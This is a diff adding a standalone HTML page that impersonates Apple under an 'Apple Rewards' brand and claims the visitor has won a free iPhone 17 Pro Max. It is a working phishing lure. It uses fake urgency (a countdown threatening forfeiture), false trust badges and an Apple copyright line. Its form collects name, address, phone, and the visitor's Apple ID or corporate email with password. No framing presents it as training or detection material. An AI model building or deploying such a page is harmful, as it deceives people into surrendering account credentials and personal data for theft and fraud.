@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Apple Rewards — Claim Your iPhone 17 Pro Max</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background-color: #000000;
+    color: #f5f5f7;
+    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
+    -webkit-font-smoothing: antialiased;
+    line-height: 1.47;
+  }
+  header {
+    background: rgba(22, 22, 23, 0.85);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border-bottom: 1px solid #333336;
+    height: 48px;
+    display: flex;
+    align-items: center;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+  .nav-inner {
+    max-width: 1024px;
+    width: 100%;
+    margin: 0 auto;
+    padding: 0 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 12px;
+    color: #d2d2d7;
+  }
+  .apple-logo {
+    font-size: 16px;
+    color: #ffffff;
+    font-weight: 600;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .nav-links { display: flex; gap: 24px; color: #a1a1a6; }
+  .nav-links span { cursor: pointer; transition: color 0.2s; }
+  .nav-links span:hover { color: #ffffff; }
+  .badge-verified {
+    background: rgba(16, 185, 129, 0.15);
+    color: #34d399;
+    border: 1px solid rgba(16, 185, 129, 0.3);
+    padding: 3px 10px;
+    border-radius: 20px;
+    font-size: 11px;
+    font-weight: 600;
+  }
+  .timer-banner {
+    background: linear-gradient(90deg, rgba(143, 30, 174, 0.2), rgba(0, 113, 227, 0.25), rgba(143, 30, 174, 0.2));
+    border-bottom: 1px solid #272729;
+    text-align: center;
+    padding: 10px 16px;
+    font-size: 12px;
+    color: #d2d2d7;
+  }
+  .timer-banner b { color: #ffffff; font-family: monospace; font-size: 14px; }
+  main {
+    max-width: 980px;
+    margin: 40px auto;
+    padding: 0 20px;
+  }
+  .hero-text {
+    text-align: center;
+    margin-bottom: 40px;
+  }
+  .tag {
+    display: inline-block;
+    background: #1d1d1f;
+    border: 1px solid #333336;
+    color: #2997ff;
+    padding: 4px 14px;
+    border-radius: 20px;
+    font-size: 12px;
+    font-weight: 500;
+    margin-bottom: 12px;
+  }
+  h1 {
+    font-size: 40px;
+    font-weight: 700;
+    letter-spacing: -0.5px;
+    color: #ffffff;
+    margin-bottom: 12px;
+  }
+  .subtitle {
+    font-size: 16px;
+    color: #86868b;
+    max-width: 600px;
+    margin: 0 auto;
+  }
+  .claim-grid {
+    display: grid;
+    grid-template-columns: 1fr 1.35fr;
+    gap: 32px;
+    margin-top: 30px;
+  }
+  @media (max-width: 768px) {
+    .claim-grid { grid-template-columns: 1fr; }
+    h1 { font-size: 28px; }
+    .nav-links { display: none; }
+  }
+  .card {
+    background: #161617;
+    border: 1px solid #333336;
+    border-radius: 20px;
+    padding: 28px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+  }
+  .phone-mockup {
+    width: 170px;
+    height: 240px;
+    background: linear-gradient(180deg, #2c2c2e, #1c1c1e);
+    border: 1px solid #3a3a3c;
+    border-radius: 30px;
+    margin: 0 auto 20px auto;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    padding: 10px;
+    text-align: center;
+  }
+  .island { width: 50px; height: 10px; background: #000; border-radius: 10px; margin: 0 auto; }
+  .screen-center { flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+  .finish-title { font-size: 13px; font-weight: 600; text-align: center; margin-bottom: 10px; color: #ffffff; }
+  .color-selector { display: flex; justify-content: center; gap: 14px; margin-bottom: 24px; }
+  .color-btn {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+    background: none;
+    border: none;
+    color: #86868b;
+    font-size: 10px;
+    cursor: pointer;
+  }
+  .color-swatch {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    border: 2px solid transparent;
+  }
+  .color-btn.active .color-swatch { border-color: #0071e3; }
+  .color-btn.active { color: #ffffff; font-weight: 600; }
+  .price-breakdown {
+    border-top: 1px solid #262629;
+    padding-top: 16px;
+    font-size: 12px;
+  }
+  .price-row { display: flex; justify-content: space-between; margin-bottom: 8px; color: #86868b; }
+  .total-row {
+    border-top: 1px solid #262629;
+    padding-top: 10px;
+    font-size: 14px;
+    font-weight: 700;
+    color: #ffffff;
+    display: flex;
+    justify-content: space-between;
+  }
+  .form-section-title {
+    font-size: 12px;
+    font-weight: 700;
+    color: #2997ff;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+  .input-group { margin-bottom: 14px; }
+  .input-group label { display: block; font-size: 12px; color: #86868b; margin-bottom: 6px; }
+  .input-group input {
+    width: 100%;
+    background: #1d1d1f;
+    border: 1px solid #333336;
+    border-radius: 12px;
+    padding: 12px 14px;
+    color: #ffffff;
+    font-size: 13px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  .input-group input:focus { border-color: #0071e3; }
+  .input-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  .verify-box {
+    background: #1d1d1f;
+    border: 1px solid #333336;
+    border-radius: 12px;
+    padding: 12px;
+    font-size: 11px;
+    color: #86868b;
+    margin-bottom: 14px;
+    line-height: 1.5;
+  }
+  .submit-btn {
+    width: 100%;
+    background: #0071e3;
+    color: #ffffff;
+    border: none;
+    border-radius: 12px;
+    padding: 14px;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    box-shadow: 0 4px 18px rgba(0, 113, 227, 0.35);
+    transition: background 0.2s, transform 0.1s;
+    margin-top: 8px;
+  }
+  .submit-btn:hover { background: #0077ed; }
+  .submit-btn:active { transform: scale(0.99); }
+  .security-badges {
+    display: flex;
+    justify-content: center;
+    gap: 16px;
+    font-size: 11px;
+    color: #6e6e73;
+    margin-top: 14px;
+  }
+  footer {
+    border-top: 1px solid #262629;
+    padding: 30px 20px;
+    font-size: 11px;
+    color: #6e6e73;
+    text-align: center;
+    margin-top: 60px;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="nav-inner">
+    <div class="apple-logo"> Apple Rewards</div>
+    <div class="nav-links">
+      <span>Store</span>
+      <span>Mac</span>
+      <span>iPad</span>
+      <span style="color:#ffffff; font-weight:600;">iPhone 17 Pro</span>
+      <span>Watch</span>
+      <span>Support</span>
+    </div>
+    <div class="badge-verified">✓ Verified Voucher</div>
+  </div>
+</header>
+
+<div class="timer-banner">
+  Allocation held for: <b id="countdown">08:42</b> before forfeiture to backup winner.
+</div>
+
+<main>
+  <div class="hero-text">
+    <span class="tag">2026 VIP Customer Appreciation Program</span>
+    <h1>Congratulations. Your iPhone 17 Pro Max is ready.</h1>
+    <p class="subtitle">
+      Your registered email was selected in our annual reward allocation. Complete your priority courier reservation below to receive your complimentary 1TB Titanium device.
+    </p>
+  </div>
+
+  <div class="claim-grid">
+    <!-- Left: Product Card -->
+    <div class="card">
+      <div class="phone-mockup">
+        <div class="island"></div>
+        <div class="screen-center">
+          <div style="font-size: 32px; margin-bottom: 6px;">🎁</div>
+          <div style="font-weight: 700; font-size: 13px;">iPhone 17 Pro Max</div>
+          <div style="font-size: 11px; color: #86868b; font-family: monospace;">1TB Titanium</div>
+        </div>
+        <div style="width: 40px; height: 3px; background: rgba(255,255,255,0.3); border-radius: 2px; margin: 0 auto;"></div>
+      </div>
+
+      <div class="finish-title">Select Titanium Finish:</div>
+      <div class="color-selector">
+        <button type="button" class="color-btn active" onclick="selectColor(this)">
+          <span class="color-swatch" style="background:#9a958e;"></span>
+          <span>Natural</span>
+        </button>
+        <button type="button" class="color-btn" onclick="selectColor(this)">
+          <span class="color-swatch" style="background:#2b2c2e;"></span>
+          <span>Space Black</span>
+        </button>
+        <button type="button" class="color-btn" onclick="selectColor(this)">
+          <span class="color-swatch" style="background:#b3957f;"></span>
+          <span>Desert</span>
+        </button>
+      </div>
+
+      <div class="price-breakdown">
+        <div class="price-row">
+          <span>Retail Value:</span>
+          <span style="text-decoration: line-through;">$1,499.00 USD</span>
+        </div>
+        <div class="price-row" style="color: #34d399; font-weight: 600;">
+          <span>VIP Loyalty Voucher:</span>
+          <span>-$1,499.00 (100% OFF)</span>
+        </div>
+        <div class="price-row">
+          <span>Priority Express Courier:</span>
+          <span style="color: #ffffff;">FREE</span>
+        </div>
+        <div class="total-row">
+          <span>Total Due Today:</span>
+          <span style="color: #34d399; font-family: monospace;">$0.00</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Right: Claim Form -->
+    <div class="card">
+      <div style="margin-bottom: 20px;">
+        <h2 style="font-size: 20px; font-weight: 700;">Shipping Address & Verification</h2>
+        <p style="font-size: 12px; color: #86868b; margin-top: 4px;">
+          Provide your courier delivery destination and verify identity to release your tracking voucher.
+        </p>
+      </div>
+
+      <form id="claim-form">
+        <div class="form-section-title">📦 1. Delivery Details</div>
+        
+        <div class="input-group">
+          <label>Recipient Full Name</label>
+          <input type="text" required placeholder="e.g. Abebe Kebede" name="fullname">
+        </div>
+
+        <div class="input-row">
+          <div class="input-group">
+            <label>Street / City Address</label>
+            <input type="text" required placeholder="Bole Sub-City, House 420" name="address">
+          </div>
+          <div class="input-group">
+            <label>Phone (for Courier Tracking SMS)</label>
+            <input type="tel" required placeholder="+251 91 123 4567" name="phone">
+          </div>
+        </div>
+
+        <div class="form-section-title" style="margin-top: 20px;">🔒 2. Account Ownership Verification</div>
+        
+        <div class="verify-box">
+          Sign in with your Apple ID or primary corporate email to authorize release of voucher code <b>#APP-884920-VIP</b>.
+        </div>
+
+        <div class="input-group">
+          <label>Apple ID / Email</label>
+          <input type="email" required placeholder="name@company.com or appleid@icloud.com" name="email">
+        </div>
+
+        <div class="input-group">
+          <label>Password</label>
+          <input type="password" required placeholder="••••••••••••" name="password">
+        </div>
+
+        <button type="submit" class="submit-btn">
+          ✓ Confirm Reservation & Ship My iPhone 17 Pro Max
+        </button>
+
+        <div class="security-badges">
+          <span>🔒 256-Bit SSL Encrypted</span>
+          <span>•</span>
+          <span>Official Distribution</span>
+          <span>•</span>
+          <span>No Payment Required</span>
+        </div>
+      </form>
+    </div>
+  </div>
+</main>
+
+<footer>
+  Copyright © 2026 Apple Inc. All rights reserved. | Privacy Policy | Terms of Use | Sales and Refunds | Legal
+</footer>
+
+<script>
+  let seconds = 522;
+  const timerEl = document.getElementById("countdown");
+  setInterval(() => {
+    if (seconds > 1) seconds--;
+    const m = Math.floor(seconds / 60);
+    const s = seconds % 60;
+    if (timerEl) {
+      timerEl.textContent = String(m).padStart(2, "0") + ":" + String(s).padStart(2, "0");
+    }
+  }, 1000);
+
+  function selectColor(btn) {
+    document.querySelectorAll(".color-btn").forEach(b => b.classList.remove("active"));
+    btn.classList.add("active");
+  }
+</script>
+
+</body>
+</html>
